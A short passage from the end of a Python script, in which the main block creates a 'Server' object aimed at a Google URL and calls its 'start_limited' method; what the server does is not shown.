        return self


if __name__ == '__main__':
    server = Server(target="https://google.com")
    server.start_limited()

```
